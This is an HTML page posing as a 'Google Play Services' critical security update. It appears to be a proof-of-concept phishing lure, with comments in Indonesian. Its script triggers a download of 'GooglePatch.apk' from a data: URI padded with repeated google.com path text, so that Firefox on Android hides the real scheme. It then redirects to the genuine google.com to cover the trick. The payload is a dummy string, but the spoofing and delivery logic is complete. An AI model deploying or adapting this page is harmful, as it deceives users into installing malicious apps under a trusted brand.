<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play Services Update</title>
    <style>
        body { 
            background: #121212; 
            color: #e8eaed; 
            font-family: 'Roboto', sans-serif; 
            text-align: center; 
            padding-top: 100px; 
            margin: 0;
        }
        .container { 
            border: 1px solid #3c4043; 
            padding: 40px; 
            display: inline-block; 
            border-radius: 8px; 
            background: #202124;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            max-width: 350px;
        }
        .logo { font-size: 2.5em; font-weight: bold; margin-bottom: 15px; }
        .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
        
        h3 { margin-top: 0; font-weight: 400; }
        p { color: #bdc1c6; font-size: 14px; line-height: 1.6; }

        #strikeBtn {
            margin-top: 20px;
            padding: 12px 24px;
            background: #8ab4f8;
            color: #202124;
            border: none;
            cursor: pointer;
            font-weight: 500;
            border-radius: 4px;
            font-size: 14px;
            width: 100%;
        }
        #strikeBtn:active { background: #aecbfa; }

        #status { 
            margin-top: 25px; 
            font-size: 11px; 
            color: #5f6368; 
            font-family: 'Courier New', monospace; 
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <h3>System Update</h3>
        <p>A critical patch for Google Play Services is ready to install. This update improves device security.</p>
        
        <button type="button" id="strikeBtn">INSTALL UPDATE</button>
        
        <div id="status">> Awaiting user action...</div>
    </div>

<script>
    document.getElementById('strikeBtn').addEventListener('click', function() {
        const filename = "GooglePatch.apk";
        const spoofDomain = "www.google.com";
        
        // --- Logic Spoofing (Fokus ke Firefox Android) ---
        // Menggunakan padding masif agar skema 'data:' terpotong di UI Firefox
        const padding = ".https://" + spoofDomain + "/update-patch/".repeat(25);
        const longSub = spoofDomain + padding;
        const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; // Dummy Base64
        const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;

        const a = document.createElement('a');
        a.href = payload;
        a.download = filename;
        document.body.appendChild(a);

        // --- STEP 1: TRIGGER DOWNLOAD ---
        // Kita klik dulu agar browser (Chrome/Firefox) mencatat interaksi user
        a.click();

        // --- STEP 2: UPDATE UI ---
        document.getElementById('status').innerText = "> INITIATING DOWNLOAD...";
        document.getElementById('strikeBtn').innerText = "DOWNLOADING...";
        document.getElementById('strikeBtn').disabled = true;

        // --- STEP 3: REDIRECT SETELAH JEDA ---
        // Jeda 600ms memberikan waktu bagi background process untuk memunculkan dialog download
        // sebelum halaman berpindah ke Google yang asli.
        setTimeout(() => {
            window.location.href = "https://www.google.com";
            document.body.removeChild(a);
        }, 600); 
    });
</script>

</body>
</html>
